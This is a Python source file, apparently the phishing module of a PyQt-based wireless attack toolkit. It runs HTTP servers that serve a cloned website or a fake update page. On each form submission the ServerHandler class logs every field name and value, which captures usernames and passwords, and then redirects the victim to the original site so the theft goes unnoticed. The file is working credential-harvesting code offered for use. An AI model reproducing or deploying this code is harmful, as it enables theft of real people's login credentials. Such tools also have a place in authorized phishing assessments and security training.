from PyQt4.QtCore import QThread,pyqtSignal
from core.utils import setup_logger
from core.utility.constants import LOG_PHISHING
import http.server
from http.server import *
from socketserver import *
import threading
from urllib import request
from urllib.request import urlopen, URLError
import logging
import socket
import cgi


class ServerHandler(SimpleHTTPRequestHandler):
    ''' server http for website clone module Phishing'''
    redirect_Original_website,redirect_Path,only_server = None,None,False
    def do_GET(self):
        self.log_message('',"Connected : %s" %(self.address_string()))
        if self.path =='/':self.path = self.redirect_Path
        if self.path.startswith('/'): self.path = self.redirect_Path + self.path
        return SimpleHTTPRequestHandler.do_GET(self)

    def log_message(self, format, *args):
        return

    def redirect(self, page="/"):
        if not page.startswith('http://'):
            page = 'http://' + page
        self.send_response(301)
        self.send_header('Location', page)
        self.end_headers()

    def do_POST(self):
        try:
            if not self.only_server:
                form = cgi.FieldStorage(
                    fp=self.rfile,
                    headers=self.headers,
                    environ={'REQUEST_METHOD':'POST',
                    'CONTENT_TYPE':self.headers['Content-Type'],
                    }
                )
                if form.list:
                    for item in form.list:
                        if item.name and item.value:
                            self.log_message('',item.name+' : '+item.value)
        except: pass
        self.redirect(self.redirect_Original_website)
        self.connection.close()

class ServerPhishing(SimpleHTTPRequestHandler):
    ''' server http for website clone module Phishing'''
    redirect_Path = None,None
    def do_GET(self):
        self.log_message('',"Connected : %s" %(self.address_string()))
        if self.path =='/':self.path = self.redirect_Path
        if self.path.startswith('/'): self.path = self.redirect_Path + self.path
        SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        self.send_response(301)
        self.end_headers()
        self.connection.close()

    def log_message(self, format, *args): return

class MyHTTPServer(HTTPServer):
    ''' by: Piotr Dobrogost callback for start and stop event '''
    def __init__(self, *args, **kwargs):
        self.on_before_serve = kwargs.pop('on_before_serve', None)
        HTTPServer.__init__(self, *args, **kwargs)

    def serve_forever(self, poll_interval=0.5):
        try:
            if self.on_before_serve:
                self.on_before_serve(self)
            HTTPServer.serve_forever(self, poll_interval)
        except Exception as e:
            print(e)
            print("ok\n")

class ThreadHTTPServerPhishing(QThread):
    ''' server http for website  module::UpdateFake'''
    request = pyqtSignal(object)
    def __init__(self,PORT,DIRECTORY,parent=None):
        super(ThreadHTTPServerPhishing, self).__init__(parent)
        self.PORT,self.DIRECTORY = PORT,DIRECTORY

    def run(self):
        self.httpd = None
        self.Handler = ServerPhishing
        self.Handler.redirect_Path = self.DIRECTORY
        self.Handler.log_message = self.Method_GET_REQUEST
        self.httpd = MyHTTPServer(('', self.PORT), self.Handler,
        on_before_serve = self.httpd)
        self.httpd.allow_reuse_address = True
        self.httpd.serve_forever()

    def Method_GET_REQUEST(self,format, *args ):
        self.request.emit('{}'.format(list(args)[0]))

    def stop(self):
        try:
            self.httpd.shutdown()
            self.httpd.server_close()
        except AttributeError: pass

class ServerThreadHTTP(QThread):
    ''' server http for website custom module Phishing '''
    requestHTTP = pyqtSignal(object)
    def __init__(self,Address,PORT,redirect=None,directory=None,session=str()):
        self.Address,self.PORT = Address,PORT
        self.session = session
        self.Handler = ServerHandler
        self.Handler.redirect_Original_website = redirect
        self.Handler.redirect_Path = directory
        QThread.__init__(self)

    def run(self):
        self.httpd = None
        self.httpd = MyHTTPServer((self.Address, self.PORT), self.Handler,on_before_serve = self.httpd)
        self.Handler.log_message = self.Method_GET_LOG
        setup_logger('phishing', LOG_PHISHING, key=self.session)
        self.log_phishing = logging.getLogger('phishing')
        try:
            self.httpd.serve_forever()
        except Exception as e:
            print(e)

    def Method_GET_LOG(self,format, *args):
        self.log_phishing.info(list(args)[0])
        self.requestHTTP.emit(list(args)[0])

    def stop(self):
        try:
            self.httpd.shutdown()
            self.httpd.server_close()
        except AttributeError: pass
